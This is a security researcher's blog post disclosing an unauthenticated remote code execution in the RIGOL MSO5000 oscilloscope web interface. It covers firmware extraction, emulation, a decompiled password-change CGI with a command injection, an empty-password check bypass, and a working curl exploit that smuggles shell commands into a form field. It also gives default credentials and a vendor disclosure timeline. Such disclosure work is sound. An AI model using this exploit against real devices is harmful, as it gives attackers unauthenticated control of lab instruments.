<!doctype html>










































<html
  class="not-ready lg:text-base"
  style="--bg: #fbfbfb"
  lang="en-us"
>
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, shrink-to-fit=no"
  />

  
  <title>Unauthenticated RCE on a RIGOL oscilloscope - tortel.li</title>

  
  <meta name="theme-color" />

  
  
  
  <meta name="description" content="I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.
One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!
I was super curious so I decided to try and (digitally) crack it open." />
  <meta name="author" content="Manuel Romei" />
  

  
  
  
  
  
  
  <link rel="preload stylesheet" as="style" href="https://tortel.li/main.min.css" />

  
  <script
    defer
    src="https://tortel.li/highlight.min.js"
    onload="hljs.initHighlightingOnLoad();"
  ></script>
  

  
     
  <link rel="preload" as="image" href="https://tortel.li/theme.svg" />

  
  
  
  <link rel="preload" as="image" href="https://avatars.githubusercontent.com/u/24835026" />
  
  

  
  <link rel="preload" as="image" href="https://tortel.li/twitter.svg" />
  
  <link rel="preload" as="image" href="https://tortel.li/github.svg" />
  
  <link rel="preload" as="image" href="https://tortel.li/instagram.svg" />
  
  <link rel="preload" as="image" href="https://tortel.li/mastodon.svg" />
  
  <link rel="preload" as="image" href="https://tortel.li/rss.svg" />
  
  

  
  

  
  <link rel="icon" href="https://tortel.li/favicon.ico" />
  <link rel="apple-touch-icon" href="https://tortel.li/apple-touch-icon.png" />

  
  <meta name="generator" content="Hugo 0.101.0" />

  
  

  
  
  
  
  
  <meta itemprop="name" content="Unauthenticated RCE on a RIGOL oscilloscope">
<meta itemprop="description" content="I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.
One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!
I was super curious so I decided to try and (digitally) crack it open."><meta itemprop="datePublished" content="2023-02-08T14:59:51+01:00" />
<meta itemprop="dateModified" content="2023-02-08T14:59:51+01:00" />
<meta itemprop="wordCount" content="1222">
<meta itemprop="keywords" content="" />
  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Unauthenticated RCE on a RIGOL oscilloscope"/>
<meta name="twitter:description" content="I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.
One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!
I was super curious so I decided to try and (digitally) crack it open."/>

  
  
</head>

  <body class="text-black duration-200 ease-out dark:text-white">
    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
  <div class="relative z-50 mr-auto flex items-center">
    <a
      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
      href="https://tortel.li/"
      >tortel.li</a
    >
    <div
      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
      role="button"
      aria-label="Dark"
    ></div>
  </div>

  <div
    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
    role="button"
    aria-label="Menu"
  ></div>

  
  <script>
    
    const htmlClass = document.documentElement.classList;
    setTimeout(() => {
      htmlClass.remove('not-ready');
    }, 10);

    
    const btnMenu = document.querySelector('.btn-menu');
    btnMenu.addEventListener('click', () => {
      htmlClass.toggle('open');
    });

    
    const metaTheme = document.querySelector('meta[name="theme-color"]');
    const lightBg = '#fbfbfb'.replace(/"/g, '');
    const setDark = (isDark) => {
      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
      htmlClass[isDark ? 'add' : 'remove']('dark');
      localStorage.setItem('dark', isDark);
    };

    
    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
    if (htmlClass.contains('dark')) {
      setDark(true);
    } else {
      const darkVal = localStorage.getItem('dark');
      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
    }

    
    darkScheme.addEventListener('change', (event) => {
      setDark(event.matches);
    });

    
    const btnDark = document.querySelector('.btn-dark');
    btnDark.addEventListener('click', () => {
      setDark(localStorage.getItem('dark') !== 'true');
    });
  </script>

  <div
    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
  >
    
    
    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
      
      <a
        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
        href="/about/"
        >About</a
      >
      
    </nav>
    

    
    <nav
      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
    >
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./twitter.svg)"
        href="https://twitter.com/kriive"
        target="_blank"
        rel="me"
      >
        twitter
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./github.svg)"
        href="https://github.com/kriive"
        target="_blank"
        rel="me"
      >
        github
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./instagram.svg)"
        href="https://instagram.com/manuelromei"
        target="_blank"
        rel="me"
      >
        instagram
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./mastodon.svg)"
        href="https://fosstodon.org/@kriive"
        target="_blank"
        rel="me"
      >
        mastodon
      </a>
      
      <a
        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
        style="--url: url(./rss.svg)"
        href="https://tortel.li/index.xml"
        target="_blank"
        rel="alternate"
      >
        rss
      </a>
      
    </nav>
    
  </div>
</header>


    <main
      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
    >
      

<article>
  <header class="mb-16">
    <h1 class="!my-0 pb-2.5">Unauthenticated RCE on a RIGOL oscilloscope</h1>

    
    <div class="text-sm antialiased opacity-60">
      
      <time>Feb 8, 2023</time>
      
      
      
      
    </div>
    
  </header>

  <section><p>I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.</p>
<p>One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!</p>
<p><img src="/rigol_web_control.png" alt=""></p>
<p>I was super curious so I decided to try and (digitally) crack it open. I headed to the <a href="https://www.rigolna.com/firmware/">vendor firmware downloads page</a>, selected the MSO5000 firmware and waited for my browser to complete the download.</p>
<p>The downloaded file ends in .GEL, and I have never seen that extension before. <code>file</code> thinks it&rsquo;s a tar archive, so let&rsquo;s try to use <code>binwalk -e</code> and extract what&rsquo;s inside.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>$ tree --charset=ascii .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>`-- _DS5000Update.GEL.extracted
</span></span><span style="display:flex;"><span>    |-- 0.tar
</span></span><span style="display:flex;"><span>    |-- app.img.gz
</span></span><span style="display:flex;"><span>    |-- fw4linux.sh
</span></span><span style="display:flex;"><span>    |-- fw4uboot.sh
</span></span><span style="display:flex;"><span>    |-- logo.hex.gz
</span></span><span style="display:flex;"><span>    |-- system.img.gz
</span></span><span style="display:flex;"><span>    `-- zynq.bit.gz
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1 directory, 7 files
</span></span></code></pre></div><p>The <code>app.img.gz</code> looked intersting and after extraction, in fact turned out containing the binaries for the web control application.</p>
<p>After extracting the <code>app.img.gz</code> with <code>p7zip</code>, I used <code>binwalk -e</code> again (it actually asked to install <a href="https://github.com/jrspruitt/ubi_reader">this tool</a> before allowing me to extract the files) and this was the resulting folder.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>$ tree --charset=ascii -L 2 .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>`-- app
</span></span><span style="display:flex;"><span>    |-- appEntry
</span></span><span style="display:flex;"><span>    |-- cups
</span></span><span style="display:flex;"><span>    |-- default
</span></span><span style="display:flex;"><span>    |-- drivers
</span></span><span style="display:flex;"><span>    |-- K160M_TOP.bit
</span></span><span style="display:flex;"><span>    |-- mail
</span></span><span style="display:flex;"><span>    |-- Qt5.5
</span></span><span style="display:flex;"><span>    |-- resource
</span></span><span style="display:flex;"><span>    |-- shell
</span></span><span style="display:flex;"><span>    |-- tools
</span></span><span style="display:flex;"><span>    `-- webcontrol
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>10 directories, 2 files
</span></span></code></pre></div><p>Hooray! The <code>webcontrol</code> folder looks promising. And in fact here there are all the files needed in order to launch the webcontrol application.</p>
<h2 id="lets-try-to-emulate-it">Let&rsquo;s try to emulate it!</h2>
<p>We will use <code>qemu</code> and <code>chroot</code> in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.</p>
<p>But before tinkering with <code>qemu</code>, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.</p>
<p>Extract the <code>system.img</code> file we found before with <code>binwalk -e</code>. It will contain a file named <code>rootfs.img</code>, which is an ext2 image.</p>
<p>Mount and copy the rootfs image with <code>mkdir mount &amp;&amp; sudo mount rootfs.img mount/ &amp;&amp; cp -r mount rootfs &amp;&amp; sudo umount mount</code>. This should be the result.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>$ tree -L 1 --charset=ascii
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>|-- bin
</span></span><span style="display:flex;"><span>|-- checkapp
</span></span><span style="display:flex;"><span>|-- dev
</span></span><span style="display:flex;"><span>|-- etc
</span></span><span style="display:flex;"><span>|-- home
</span></span><span style="display:flex;"><span>|-- lib
</span></span><span style="display:flex;"><span>|-- licenses
</span></span><span style="display:flex;"><span>|-- linuxrc -&gt; bin/busybox
</span></span><span style="display:flex;"><span>|-- lost+found
</span></span><span style="display:flex;"><span>|-- media
</span></span><span style="display:flex;"><span>|-- mnt
</span></span><span style="display:flex;"><span>|-- opt
</span></span><span style="display:flex;"><span>|-- proc
</span></span><span style="display:flex;"><span>|-- rigol
</span></span><span style="display:flex;"><span>|-- root
</span></span><span style="display:flex;"><span>|-- sbin
</span></span><span style="display:flex;"><span>|-- sys
</span></span><span style="display:flex;"><span>|-- tmp
</span></span><span style="display:flex;"><span>|-- ubifs-util
</span></span><span style="display:flex;"><span>|-- user
</span></span><span style="display:flex;"><span>|-- usr
</span></span><span style="display:flex;"><span>`-- var
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>20 directories, 2 files
</span></span></code></pre></div><p>Now, let&rsquo;s try to emulate something with <code>qemu</code>, like a shell.</p>
<p>Make sure to install <code>qemu qemu-user-static binfmt-support</code>. If you&rsquo;re using Ubuntu: <code>sudo apt install qemu qemu-user-static binfmt-support</code>.</p>
<p>Then copy <code>qemu-arm-static</code> to a place inside the rootfs, so when we <code>chroot</code> into the folder, it will be found.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp /usr/bin/qemu-arm-static ./rootfs/bin
</span></span></code></pre></div><p>Then use <code>sudo chroot . sh</code> to emulate a shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>~/rootfs 
</span></span><span style="display:flex;"><span>$ sudo chroot . sh
</span></span><span style="display:flex;"><span>/ # ls
</span></span><span style="display:flex;"><span>bin         home        lost+found  proc        sys         usr
</span></span><span style="display:flex;"><span>checkapp    lib         media       rigol       tmp         var
</span></span><span style="display:flex;"><span>dev         licenses    mnt         root        ubifs-util
</span></span><span style="display:flex;"><span>etc         linuxrc     opt         sbin        user
</span></span><span style="display:flex;"><span>/ # whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>/ # uname -a
</span></span><span style="display:flex;"><span>Linux pwnOS 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 armv7l GNU/Linux
</span></span><span style="display:flex;"><span>/ # 
</span></span></code></pre></div><p>Perfect, we have a functioning rootfs. Let&rsquo;s try to execute some RIGOL software. Copy the <code>/webcontrol</code> folder we found in the <code>app.img</code> file into <code>rootfs/rigol</code>, don&rsquo;t copy it to the rootfs root, otherwise ld.so complains for some reason.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cp -r ~/Downloads/osc/app/webcontrol ./rootfs/rigol
</span></span></code></pre></div><p>If we looked inside the <code>app.img</code> dump, we would have found a file named <code>app/shell/start.sh</code> that is responsible to launch the main components of the oscilloscope. In that file, we can see the part that launches the web control application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>############################################
</span></span><span style="display:flex;"><span>#Start webcontrol service
</span></span><span style="display:flex;"><span>############################################
</span></span><span style="display:flex;"><span>DATA_FILE=/rigol/data/user.conf
</span></span><span style="display:flex;"><span>if [ ! -f $DATA_FILE ]; then
</span></span><span style="display:flex;"><span>	cp /rigol/default/user.conf /rigol/data/
</span></span><span style="display:flex;"><span>	sync
</span></span><span style="display:flex;"><span>fi
</span></span><span style="display:flex;"><span>/rigol/webcontrol/sbin/lighttpd -f /rigol/webcontrol/config/lighttpd.conf &amp;
</span></span></code></pre></div><p><em>By default, the file <code>/rigol/default/user.conf</code> contains only
<code>admin:rigol</code> (which are the default credentials of the web application).Let&rsquo;s create a new file <code>/rigol/webcontrol/config/user.conf</code> with <code>admin:rigol</code></em></p>
<p>Let&rsquo;s try to launch the webcontrol!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Let&#39;s use -D to avoid letting the server go in the background.</span>
</span></span><span style="display:flex;"><span>sudo chroot . /rigol/webcontrol/sbin/lighttpd -D -f /rigol/webcontrol/config/lighttpd.conf
</span></span></code></pre></div><p><img src="/rigol_web_control_emulated.png" alt="The emulated web server, we did it!"></p>
<p>We did it! Since we now have a functioning RIGOL web control application, let&rsquo;s start to look for bugs.</p>
<p>While I could have started anywhere, I was intrigued by the <code>cgi-bin</code> folder. I fired up my Ghidra instance and I loaded every <code>cgi-bin</code> entry into it.</p>
<p>After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on <code>changepwd.cgi</code>.</p>
<p>Let&rsquo;s load it on Ghidra.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>This binary gets executed every time the user wants to change their password.</p>
<p>First of all we need to find the <code>main</code> function. Luckily, symbols are left intact in this, so we don&rsquo;t have to guess too much. The main function is a little bit strange: turns out that this binary uses <a href="https://github.com/boutell/cgic">this library</a> to handle CGI programming in C.</p>
<p>As the project&rsquo;s <code>README</code> <a href="https://github.com/boutell/cgic#how-to-write-a-cgic-application">says</a>, the developer&rsquo;s custom code starts in the function <code>cgiMain()</code>. Let&rsquo;s find it.</p>
<p><img src="/changepwd-bin.png" alt="The disassembly"></p>
<p>The call to <code>system</code> looks super suspicious. The author basically wanted a quick way to write <code>admin:user_password</code> inside the <code>path</code> file (<code>/rigol/data/user.conf</code>). It does this by launching a shell and executing <code>echo admin:user_password &gt; /rigol/data/user.conf</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>n <span style="color:#f92672">=</span> strlen(pass0);
</span></span><span style="display:flex;"><span>iVar2 <span style="color:#f92672">=</span> strncmp(saved_pwd,pass0,n);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    sprintf(<span style="color:#f92672">&amp;</span>CMD_BUF,<span style="color:#e6db74">&#34;echo admin:%s &gt; %s&#34;</span>,pass1,path);
</span></span><span style="display:flex;"><span>    system(<span style="color:#f92672">&amp;</span>CMD_BUF);
</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#34;sync&#34;</span>);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;OK&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Old password is wrong&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If an attacker passing something like <code>; whoami # </code> as <code>pass1</code>, they could execute arbitrary commands on the underlying system.</p>
<p>But, in order to reach that command injection vulnerability we need to pass the <code>strncmp</code> check that checks <code>pass0</code> against the saved password.</p>
<p>As per the manual, the <code>int strncmp(const char s1, const char s2, size_t n)</code> function compares the first <code>n</code> characters of the two strings. It is a little less known that if <code>n</code> is 0, the result of the <code>strncmp</code> function is also 0.</p>
<p>Can we force <code>n</code> to be 0?</p>
<p>Yes, if we manage to control <code>pass0</code>. If we passed an empty <code>pass0</code>, the <code>strlen</code> function would return 0 and that 0 would get passed as the <code>n</code> parameter to the <code>strncmp</code> function, letting us bypass the check!</p>
<p>So, we need to check whether we actually control <code>pass0</code> and <code>pass1</code>. If we scroll up a little bit we find these two assignments.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pcVar1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)read_item_value(<span style="color:#e6db74">&#34;pass0&#34;</span>,<span style="color:#ae81ff">256</span>);
</span></span><span style="display:flex;"><span>strcpy(pass0,pcVar1);
</span></span><span style="display:flex;"><span>pcVar1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)read_item_value(<span style="color:#e6db74">&#34;pass1&#34;</span>,<span style="color:#ae81ff">256</span>);
</span></span><span style="display:flex;"><span>strcpy(pass1,pcVar1);
</span></span></code></pre></div><p><code>read_item_value</code> is basically a wrapper around <a href="https://github.com/boutell/cgic#cgiFormString"><code>cgiFormString</code></a>. If we provide the <code>pass0</code> and <code>pass1</code> form values in our HTTP request, we&rsquo;re set.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">read_item_value</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> param,<span style="color:#66d9ef">int</span> size) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// cmd_str is a global allocated buffer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  memset(cmd_str,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  cgiFormString(param,cmd_str,size);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> cmd_str;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="the-exploit">The exploit</h2>
<p>So, in the end, we control everything! A simple <code>curl</code> command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost/cgi-bin/changepwd.cgi -d <span style="color:#e6db74">&#34;pass0=&#34;</span> -d <span style="color:#e6db74">&#34;pass1=; whoami; id; uname -a # &#34;</span>
</span></span></code></pre></div><p><img src="/exploit.png" alt="pwned"></p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>Vulnerability found, 11/8/22</li>
<li>Sent detailed PoC, 11/9/22</li>
<li>RIGOL says they would have contacted me with updates from R&amp;D, 11/9/22</li>
<li>Follow-up on the vulnerability, 1/25/23</li>
<li>RIGOL says they would reply in 2-3 days, 1/28/23</li>
<li>Full disclosure, 2/8/23</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Do not expose your RIGOL oscilloscopes to the internet.</p>
<h2 id="trivia">Trivia</h2>
<p>I also made <a href="https://github.com/havce/havceCTF/tree/master/scope">a CTF challenge</a> based on this vulnerability.</p>
</section>

  
  

  
  
  
  
  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
    
    <a
      class="flex w-1/2 items-center rounded-l-md p-6 pr-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
      href="https://tortel.li/post/dirty_filepath/"
      ><span class="mr-1.5">←</span><span>filepath.Clean: terms and conditions apply</span></a
    >
    
    
    <a
      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
      href="https://tortel.li/post/fastbin_dup/"
      ><span>Fastbin dup with tcache</span><span class="ml-1.5">→</span></a
    >
    
  </nav>
  
  

  
  

  
  
</article>


    </main>

    <footer
  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
>
  <div class="mr-auto">
    &copy; 2023
    <a class="link" href="https://tortel.li/">tortel.li</a>
  </div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >Powered by Hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >✎ Paper</a
  >
</footer>

  </body>
</html>
